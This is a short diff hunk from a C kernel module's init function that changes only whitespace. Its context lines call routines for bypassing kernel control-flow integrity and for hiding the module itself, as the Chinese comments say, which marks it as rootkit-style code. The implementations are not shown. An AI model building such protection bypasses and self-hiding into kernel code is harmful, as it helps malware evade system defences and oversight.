@@ -308,7 +308,7 @@ static int __init lsdriver_init(void)
 {
 	struct task_struct *chf;
 	struct task_struct *dhf;
-	
+
 	bypass_cfi(); // 先尝试绕过 5系的cfi
 
 	hide_myself(); // 隐藏内核模块本身
